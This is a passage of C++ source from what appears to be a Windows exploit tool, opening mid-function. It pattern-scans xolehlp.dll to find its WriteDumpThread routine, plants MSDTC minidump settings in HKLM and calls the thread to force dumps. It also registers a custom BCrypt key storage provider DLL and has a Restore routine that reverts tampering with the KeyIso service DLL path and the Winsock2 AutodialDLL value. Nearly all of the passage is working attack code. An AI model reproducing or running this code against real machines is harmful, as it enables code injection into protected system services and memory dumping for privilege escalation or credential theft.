    HMODULE hXolehlp = NULL;
    ULONG_PTR pQueueUserWorkItemThunkAddress, pXolehlpTextSection;
    DWORD dwXolehlpTextSectionSize, dwRipRelativeOffset;

    const char szCallPattern[] = { '\x48', '\xff', '\x15' };
    ULONG_PTR pCallPatternSearch, pCallPatternMatch, pCallTarget, pQueueUserWorkItemCall = 0;
    DWORD dwCallPatternSearchSize;
    DWORD dwCallPatternMatchCount;

    const char szLeaPattern[] = { '\x48', '\x8d', '\x0d' };
    ULONG_PTR pLeaPatternSearch, pLeaPatternMatch, pLeaTarget;
    const DWORD dwSearchOffset = 0x10;
    DWORD dwLeaPatternSearchSize;

    if ((hXolehlp = GetModuleHandleW(MODULE_NAME_W_XOLEHLP)) == NULL)
    {
        EXIT_ON_ERROR((hXolehlp = LoadLibraryW(MODULE_NAME_W_XOLEHLP)) == NULL);
        bXolehelpLoaded = TRUE;
    }

    EXIT_ON_ERROR(!ModuleParser::GetImportedFunctionThunkAddress(hXolehlp, MODULE_NAME_A_KERNEL32, FUNC_NAME_A_QUEUEUSERWORKITEM, &pQueueUserWorkItemThunkAddress));
    //PRINT_DEBUG(L"QueueUserWorkItem thunk address: 0x%llx", (ULONG_PTR)pQueueUserWorkItemThunkAddress);
    EXIT_ON_ERROR(!ModuleParser::GetSectionAddressAndSize(hXolehlp, ".text", &pXolehlpTextSection, &dwXolehlpTextSectionSize));
    //PRINT_DEBUG(L"Xolehlp text section @ 0x%llx (size: %d)", (ULONG_PTR)pXolehlpTextSection, dwXolehlpTextSectionSize);

    pCallPatternSearch = pXolehlpTextSection;
    dwCallPatternSearchSize = dwXolehlpTextSectionSize;
    dwCallPatternMatchCount = 0;

    while (ModuleParser::SearchPattern((PBYTE)szCallPattern, sizeof(szCallPattern), pCallPatternSearch, dwCallPatternSearchSize, &pCallPatternMatch))
    {
        memcpy(&dwRipRelativeOffset, (PVOID)(pCallPatternMatch + sizeof(szCallPattern)), sizeof(dwRipRelativeOffset));
        pCallTarget = pCallPatternMatch + sizeof(szCallPattern) + sizeof(dwRipRelativeOffset) + dwRipRelativeOffset;
        //PRINT_DEBUG(L"Found call @ 0x%llx (call offset=0x%08x), target=0x%llx", pCallPatternMatch, dwRipRelativeOffset, pCallTarget);

        if (pCallTarget == pQueueUserWorkItemThunkAddress)
        {
            PRINT_DEBUG(L"Found a QueueUserWorkItem call @ 0x%llx", pCallPatternMatch);
            pQueueUserWorkItemCall = pCallPatternMatch;
            dwCallPatternMatchCount++;
        }

        pCallPatternSearch = pCallPatternMatch + 1;
        dwCallPatternSearchSize = dwXolehlpTextSectionSize - (DWORD)(ULONG_PTR)(pCallPatternMatch - pXolehlpTextSection - 1);
    }

    if (dwCallPatternMatchCount == 0)
    {
        PRINT_ERROR(L"Failed to find a call to QueueUserWorkItem.");
        goto cleanup;
    }

    if (dwCallPatternMatchCount != 1)
    {
        PRINT_ERROR(L"Found multiple calls to QueueUserWorkItem.");
        goto cleanup;
    }

    pLeaPatternSearch = pQueueUserWorkItemCall - dwSearchOffset;
    dwLeaPatternSearchSize = dwSearchOffset;

    EXIT_ON_ERROR(!ModuleParser::SearchPattern((PBYTE)szLeaPattern, sizeof(szLeaPattern), pLeaPatternSearch, dwLeaPatternSearchSize, &pLeaPatternMatch));

    memcpy(&dwRipRelativeOffset, (PVOID)(pLeaPatternMatch + sizeof(szLeaPattern)), sizeof(dwRipRelativeOffset));
    pLeaTarget = pLeaPatternMatch + sizeof(szLeaPattern) + sizeof(dwRipRelativeOffset) + dwRipRelativeOffset;
    PRINT_DEBUG(L"QueueUserWorkItem thread start routine @ 0x%llx", pLeaTarget);

    *WriteDumpThreadAddress = pLeaTarget;
    bResult = TRUE;

cleanup:
    if (bXolehelpLoaded) FreeLibrary(hXolehlp);
    if (!bResult) PRINT_ERROR(L"Failed to determine the address of xolehelp!WriteDumpThread.");

    return bResult;
}

BOOL Exploit::RegisterMinidumpParameters(IN LPCWSTR DumpLocation, IN DWORD DumpType, IN OUT LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState)
{
    BOOL bResult = FALSE, bCreateValue;
    DWORD dwDataSize = 0;
    PDWORD pdwDumpType = NULL;

    bCreateValue = FALSE;

    if (!Registry::QueryValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_DUMPTYPE, NULL, (LPBYTE*)&pdwDumpType, &dwDataSize))
    {
        if (GetLastError() == ERROR_FILE_NOT_FOUND)
            bCreateValue = TRUE;
        else
            goto cleanup;
    }
    else
    {
        ExploitInitState->MsdtcDumpType = *pdwDumpType;
    }

    EXIT_ON_ERROR(!Registry::SetValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_DUMPTYPE, REG_DWORD, (LPBYTE)&DumpType, sizeof(DumpType)));
    ExploitState->MsdtcDumpTypeCreatedOrUpdated = bCreateValue ? 2 : 1;

    bCreateValue = FALSE;

    if (!Registry::QueryValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_MEMORYDUMPLOCATION, NULL, (LPBYTE*)&ExploitInitState->MsdtcDumpLocation, &dwDataSize))
    {
        if (GetLastError() == ERROR_FILE_NOT_FOUND)
            bCreateValue = TRUE;
        else
            goto cleanup;
    }

    dwDataSize = (DWORD)((wcslen(DumpLocation) + 1) * sizeof(*DumpLocation));

    EXIT_ON_ERROR(!Registry::SetValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_MEMORYDUMPLOCATION, REG_SZ, (LPBYTE)DumpLocation, dwDataSize));
    ExploitState->MsdtcDumpLocationCreatedOrUpdated = bCreateValue ? 2 : 1;

    bResult = TRUE;

cleanup:
    if (pdwDumpType) HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, pdwDumpType);
    if (!bResult) PRINT_ERROR(L"Failed to register MSDTC MiniDump parameters in registry.");

    return bResult;
}

BOOL Exploit::UnregisterMinidumpParameters(IN OUT LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState)
{
    BOOL bResult = FALSE;
    DWORD dwDataSize;

    if (ExploitState->MsdtcDumpTypeCreatedOrUpdated == 1)
    {
        // The value was updated, we must restore it.
        if (Registry::SetValue(
            HKEY_LOCAL_MACHINE,
            REG_PATH_W_MSDTC,
            REG_VALUE_NAME_W_DUMPTYPE,
            REG_DWORD,
            (LPBYTE)&ExploitInitState->MsdtcDumpType,
            sizeof(ExploitInitState->MsdtcDumpType)
        ))
        {
            ExploitState->MsdtcDumpTypeCreatedOrUpdated = 0;
        }
    }
    else if (ExploitState->MsdtcDumpTypeCreatedOrUpdated == 2)
    {
        // The value was created, we must delete it.
        if (Registry::DeleteValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_DUMPTYPE))
        {
            ExploitState->MsdtcDumpTypeCreatedOrUpdated = 0;
        }
    }

    if (ExploitState->MsdtcDumpLocationCreatedOrUpdated == 1)
    {
        // The value was updated, we must restore it.
        dwDataSize = (DWORD)((wcslen(ExploitInitState->MsdtcDumpLocation) + 1) * sizeof(*ExploitInitState->MsdtcDumpLocation));

        if (Registry::SetValue(
            HKEY_LOCAL_MACHINE,
            REG_PATH_W_MSDTC,
            REG_VALUE_NAME_W_MEMORYDUMPLOCATION,
            REG_SZ,
            (LPBYTE)ExploitInitState->MsdtcDumpLocation,
            dwDataSize
        ))
        {
            ExploitState->MsdtcDumpLocationCreatedOrUpdated = 0;
        }
    }
    else if (ExploitState->MsdtcDumpLocationCreatedOrUpdated == 2)
    {
        // The value was created, we must delete it.
        if (Registry::DeleteValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_MEMORYDUMPLOCATION))
        {
            ExploitState->MsdtcDumpLocationCreatedOrUpdated = 0;
        }
    }

    if (ExploitState->MsdtcDumpTypeCreatedOrUpdated != 0 || ExploitState->MsdtcDumpLocationCreatedOrUpdated != 0)
        goto cleanup;

    bResult = TRUE;

cleanup:
    if (!bResult) PRINT_ERROR(L"Failed to restore MSDTC MiniDump parameters.");

    return bResult;
}

BOOL Exploit::TestXolehlpWriteDumpThread(IN ULONG_PTR WriteDumpThreadAddress, IN LPCWSTR DumpLocation)
{
    BOOL bResult = FALSE;
    SYSTEMTIME st = { 0 };
    LPWSTR pwszDumpFilePath = NULL;

    GetLocalTime(&st);

    __try
    {
        ((LPTHREAD_START_ROUTINE)WriteDumpThreadAddress)(NULL);
        PRINT_DEBUG(L"WriteDumpThread executed!");

        EXIT_ON_ERROR(!Exploit::FindXolehlpDumpFilePath(DumpLocation, &st, NULL, &pwszDumpFilePath));
        PRINT_DEBUG(L"Found dump file: %ws", pwszDumpFilePath);

        if (!DeleteFileW(pwszDumpFilePath))
        {
            PRINT_ERROR(L"Failed to delete dump file '%ws'.", pwszDumpFilePath);
        }

        bResult = TRUE;
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        PRINT_ERROR(L"WriteDumpThread exception: 0x%08x", GetExceptionCode());
    }

cleanup:
    if (pwszDumpFilePath) HeapFree(GetProcessHeap(), 0, pwszDumpFilePath);

    return bResult;
}

BOOL Exploit::FindXolehlpDumpFilePath(IN LPCWSTR DumpLocation, IN LPSYSTEMTIME SystemTime, IN LPCWSTR ModuleName, OUT LPWSTR* DumpFilePath)
{
    BOOL bResult = FALSE, bFound;
    WCHAR wszSearchPath[MAX_PATH] = { 0 };
    SYSTEMTIME st;
    FILETIME ft;
    DWORD dwSize;
    WCHAR wszFullProcessImageName[MAX_PATH] = { 0 };
    WCHAR wszFullPathName[MAX_PATH] = { 0 };
    LPWSTR pwszFilePart = NULL;

    if (ModuleName)
    {
        pwszFilePart = (LPWSTR)ModuleName;
    }
    else
    {
        dwSize = MAX_PATH;
        EXIT_ON_ERROR(!QueryFullProcessImageNameW(GetCurrentProcess(), 0, wszFullProcessImageName, &dwSize));
        PRINT_DEBUG(L"Full process image name: %ws", wszFullProcessImageName);

        EXIT_ON_ERROR(!GetFullPathNameW(wszFullProcessImageName, MAX_PATH, wszFullPathName, &pwszFilePart));
        PRINT_DEBUG(L"Filename: %ws", pwszFilePart);
    }

    memcpy(&st, SystemTime, sizeof(st));
    bFound = FALSE;

    for (int i = 0; i < (RACE_TIMEOUT / 1000) + 10; i++)
    {
        StringCchPrintfW(wszSearchPath, MAX_PATH, L"%ws\\%ws_%02ld%02ld%04ld_%02ld%02ld%02ld.dmp",
            DumpLocation,
            pwszFilePart,
            st.wMonth, st.wDay, st.wYear,
            st.wHour, st.wMinute, st.wSecond
        );

        if (Filesystem::PathExists(wszSearchPath))
        {
            bFound = TRUE;
            break;
        }

        // https://stackoverflow.com/questions/8308236/performing-arithmetic-on-systemtime/20456363#20456363
        EXIT_ON_ERROR(!SystemTimeToFileTime(&st, &ft));
        ((ULARGE_INTEGER*)&ft)->QuadPart += (1 * 10000000LLU); // + 1 second
        EXIT_ON_ERROR(!FileTimeToSystemTime(&ft, &st));
    }

    if (bFound)
    {
        *DumpFilePath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (wcslen(wszSearchPath) + 1) * sizeof(*wszSearchPath));
        StringCchCopyW(*DumpFilePath, wcslen(wszSearchPath) + 1, wszSearchPath);
        bResult = TRUE;
    }

cleanup:

    return bResult;
}

BOOL Exploit::Restore()
{
    BOOL bResult = TRUE;
    LPWSTR pwszKeyIsoServiceDll = NULL;
    DWORD dwDataSize = 0, dwKeyIsoState = SERVICE_STOPPED;
    BOOL bRestoreKeyIso = FALSE;
    LPDWORD pdwDumpType = NULL;
    LPWSTR pwszMemoryDumpLocation = NULL;
    LPWSTR pwszAutodialDll = NULL;

    if (KeyStorageProvider::Unregister(STR_KEY_STORAGE_PROVIDER_NAME))
    {
        PRINT_INFO(L"Unregistered '%ws'.", STR_KEY_STORAGE_PROVIDER_NAME);
    }
    else
    {
        if (GetLastError() == ERROR_NOT_FOUND)
        {
            PRINT_INFO(L"'%ws' is not registered.", STR_KEY_STORAGE_PROVIDER_NAME);
        }
        else
        {
            PRINT_WARNING(L"Failed to unregister '%ws'.", STR_KEY_STORAGE_PROVIDER_NAME);
            bResult = FALSE;
        }
    }

    if (Registry::QueryValue(HKEY_LOCAL_MACHINE, REG_PATH_W_KEYISO_PARAMETERS, REG_VALUE_NAME_W_KEYISO_SERVICEDLL, NULL, (LPBYTE*)&pwszKeyIsoServiceDll, &dwDataSize))
    {
        if (!_wcsicmp(pwszKeyIsoServiceDll, REG_DATA_KEYISO_DEFAULT_SERVICEDLL))
        {
            PRINT_INFO(L"Found expected KeyIso service DLL path: %ws", REG_DATA_KEYISO_DEFAULT_SERVICEDLL);
        }
        else
        {
            PRINT_INFO(L"Found unexpected KeyIso service DLL path: %ws", pwszKeyIsoServiceDll);
            bRestoreKeyIso = TRUE;
        }
    }

    if (bRestoreKeyIso)
    {
        Service::QueryState(SERVICE_NAME_W_KEYISO, &dwKeyIsoState);
        if (dwKeyIsoState == SERVICE_RUNNING)
        {
            PRINT_INFO(L"Stopping service KeyIso...");
            if (!Service::Stop(SERVICE_NAME_W_KEYISO, TRUE))
                bResult = FALSE;
        }

        dwDataSize = (DWORD)(wcslen(REG_DATA_KEYISO_DEFAULT_SERVICEDLL) + 1) * sizeof(WCHAR);
        if (Registry::SetValue(
            HKEY_LOCAL_MACHINE,
            REG_PATH_W_KEYISO_PARAMETERS,
            REG_VALUE_NAME_W_KEYISO_SERVICEDLL,
            REG_EXPAND_SZ,
            (LPBYTE)REG_DATA_KEYISO_DEFAULT_SERVICEDLL,
            dwDataSize
        ))
        {
            PRINT_INFO(L"Restored KeyIso service DLL path.");
        }
        else
        {
            PRINT_WARNING(L"Failed to restore KeyIso service DLL path.");
            bResult = FALSE;
        }
        
        if (dwKeyIsoState == SERVICE_RUNNING)
        {
            PRINT_INFO(L"Starting service KeyIso...");
            if (!Service::Start(SERVICE_NAME_W_KEYISO, TRUE))
                bResult = FALSE;
        }
    }

    if (Registry::QueryValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_DUMPTYPE, NULL, (LPBYTE*)&pdwDumpType, &dwDataSize))
    {
        PRINT_INFO(L"Found MSDTC value '%ws' in registry with data: %d", REG_VALUE_NAME_W_DUMPTYPE, *pdwDumpType);

        if (Registry::DeleteValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_DUMPTYPE))
        {
            PRINT_INFO(L"Deleted MSDTC value '%ws'.", REG_VALUE_NAME_W_DUMPTYPE);
        }
        else
        {
            bResult = FALSE;
        }
    }

    if (Registry::QueryValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_MEMORYDUMPLOCATION, NULL, (LPBYTE*)&pwszMemoryDumpLocation, &dwDataSize))
    {
        PRINT_INFO(L"Found MSDTC value '%ws' in registry with data: %ws", REG_VALUE_NAME_W_MEMORYDUMPLOCATION, pwszMemoryDumpLocation);

        if (Registry::DeleteValue(HKEY_LOCAL_MACHINE, REG_PATH_W_MSDTC, REG_VALUE_NAME_W_MEMORYDUMPLOCATION))
        {
            PRINT_INFO(L"Deleted MSDTC value '%ws'.", REG_VALUE_NAME_W_MEMORYDUMPLOCATION);
        }
        else
        {
            bResult = FALSE;
        }
    }

    if (Registry::QueryValue(HKEY_LOCAL_MACHINE, REG_PATH_W_WINSOCK2_PARAMETERS, REG_VALUE_NAME_W_AUTODIALDLL, NULL, (LPBYTE*)&pwszAutodialDll, &dwDataSize))
    {
        if (!_wcsicmp(pwszAutodialDll, REG_DATA_WINSOCK2_DEFAULT_AUTODIALDLL))
        {
            PRINT_INFO(L"Found expected Winsock2 '%ws' value: %ws", REG_VALUE_NAME_W_AUTODIALDLL, REG_DATA_WINSOCK2_DEFAULT_AUTODIALDLL);
        }
        else
        {
            PRINT_INFO(L"Found unexpected Winsock2 '%ws' value: %ws", REG_VALUE_NAME_W_AUTODIALDLL, pwszAutodialDll);

            dwDataSize = (DWORD)(wcslen(REG_DATA_WINSOCK2_DEFAULT_AUTODIALDLL) + 1) * sizeof(WCHAR);
            if (Registry::SetValue(
                HKEY_LOCAL_MACHINE,
                REG_PATH_W_WINSOCK2_PARAMETERS,
                REG_VALUE_NAME_W_AUTODIALDLL,
                REG_SZ,
                (LPBYTE)REG_DATA_WINSOCK2_DEFAULT_AUTODIALDLL,
                dwDataSize
            ))
            {
                PRINT_INFO(L"Restored Winsock2 '%ws' value to its default: %ws", REG_VALUE_NAME_W_AUTODIALDLL, REG_DATA_WINSOCK2_DEFAULT_AUTODIALDLL);
            }
            else
            {
                bResult = FALSE;
            }
        }
    }

    if (pwszAutodialDll) HeapFree(GetProcessHeap(), 0, pwszAutodialDll);
    if (pwszMemoryDumpLocation) HeapFree(GetProcessHeap(), 0, pwszMemoryDumpLocation);
    if (pdwDumpType) HeapFree(GetProcessHeap(), 0, pdwDumpType);
    if (pwszKeyIsoServiceDll) HeapFree(GetProcessHeap(), 0, pwszKeyIsoServiceDll);

    return bResult;
}

BOOL KeyStorageProvider::Register(IN LPCWSTR ProviderName, IN LPCWSTR ImagePath)
{
    BOOL bResult = FALSE;
    HMODULE hBcrypt = NULL;
    BCryptRegisterProvider _BCryptRegisterProvider = NULL;
    BCryptAddContextFunctionProvider _BCryptAddContextFunctionProvider = NULL;
    CRYPT_PROVIDER_REG provider_reg;
    CRYPT_IMAGE_REG image_reg;
    CRYPT_INTERFACE_REG interface_reg;
    PCRYPT_INTERFACE_REG interfaces[1];
    PWSTR pwszFunctions[1];
    NTSTATUS status = STATUS_SUCCESS;

    EXIT_ON_ERROR((hBcrypt = LoadLibraryW(MODULE_NAME_W_BCRYPT)) == NULL);
    EXIT_ON_ERROR((_BCryptRegisterProvider = (BCryptRegisterProvider)GetProcAddress(hBcrypt, FUNC_NAME_A_BCRYPTREGISTERPROVIDER)) == NULL);
    EXIT_ON_ERROR((_BCryptAddContextFunctionProvider = (BCryptAddContextFunctionProvider)GetProcAddress(hBcrypt, FUNC_NAME_A_BCRYPTADDCONTEXTFUNCTIONPROVIDER)) == NULL);

    pwszFunctions[0] = const_cast<wchar_t*>(NCRYPT_KEY_STORAGE_ALGORITHM);

    interface_reg.dwInterface = NCRYPT_KEY_STORAGE_INTERFACE;
    interface_reg.dwFlags = CRYPT_LOCAL;
    interface_reg.cFunctions = 1;
    interface_reg.rgpszFunctions = pwszFunctions;

    interfaces[0] = &interface_reg;

    image_reg.pszImage = const_cast<wchar_t*>(ImagePath);
    image_reg.cInterfaces = 1;
    image_reg.rgpInterfaces = interfaces;

    provider_reg.cAliases = 0;
    provider_reg.rgpszAliases = NULL;
    provider_reg.pUM = &image_reg;
    provider_reg.pKM = NULL;

    status = _BCryptRegisterProvider(ProviderName, CRYPT_OVERWRITE, &provider_reg);
    if (!NT_SUCCESS(status))
    {
        SetLastError(RtlNtStatusToDosError(status));
        PRINT_DEBUG(L"BCryptRegisterProvider failed with error: 0x%08x", status);
        goto cleanup;
    }

    status = _BCryptAddContextFunctionProvider(CRYPT_LOCAL, NULL, NCRYPT_KEY_STORAGE_INTERFACE, NCRYPT_KEY_STORAGE_ALGORITHM, ProviderName, CRYPT_PRIORITY_BOTTOM);
    if (!NT_SUCCESS(status))
    {
        SetLastError(RtlNtStatusToDosError(status));
        PRINT_DEBUG(L"BCryptAddContextFunctionProvider failed with error: 0x%08x", status);
        goto cleanup;
    }

    bResult = TRUE;

cleanup:
    if (!bResult) Util::PrintLastError(GetLastError());
    if (hBcrypt) FreeLibrary(hBcrypt);

    return bResult;
}

BOOL KeyStorageProvider::Unregister(IN LPCWSTR ProviderName)
{
    BOOL bResult = FALSE;
    HMODULE hBcrypt = NULL;
    BCryptRemoveContextFunctionProvider _BCryptRemoveContextFunctionProvider = NULL;
    BCryptUnregisterProvider _BCryptUnregisterProvider = NULL;
    NTSTATUS status;

    EXIT_ON_ERROR((hBcrypt = LoadLibraryW(MODULE_NAME_W_BCRYPT)) == NULL);
    EXIT_ON_ERROR((_BCryptRemoveContextFunctionProvider = (BCryptRemoveContextFunctionProvider)GetProcAddress(hBcrypt, FUNC_NAME_A_BCRYPTREMOVECONTEXTFUNCTIONPROVIDER)) == NULL);
    EXIT_ON_ERROR((_BCryptUnregisterProvider = (BCryptUnregisterProvider)GetProcAddress(hBcrypt, FUNC_NAME_A_BCRYPTUNREGISTERPROVIDER)) == NULL);

    status = _BCryptRemoveContextFunctionProvider(CRYPT_LOCAL, NULL, NCRYPT_KEY_STORAGE_INTERFACE, NCRYPT_KEY_STORAGE_ALGORITHM, ProviderName);
    if (!NT_SUCCESS(status))
    {
        SetLastError(RtlNtStatusToDosError(status));
        PRINT_DEBUG(L"BCryptRemoveContextFunctionProvider failed with error: 0x%08x", status);
        goto cleanup;
    }

    status = _BCryptUnregisterProvider(ProviderName);
    if (!NT_SUCCESS(status))
    {
        SetLastError(RtlNtStatusToDosError(status));
        PRINT_DEBUG(L"BCryptUnregisterProvider failed with error: 0x%08x", status);
        goto cleanup;
    }

    bResult = TRUE;

cleanup:
    if (!bResult) Util::PrintLastError(GetLastError());
    if (hBcrypt) FreeLibrary(hBcrypt);

    return bResult;
}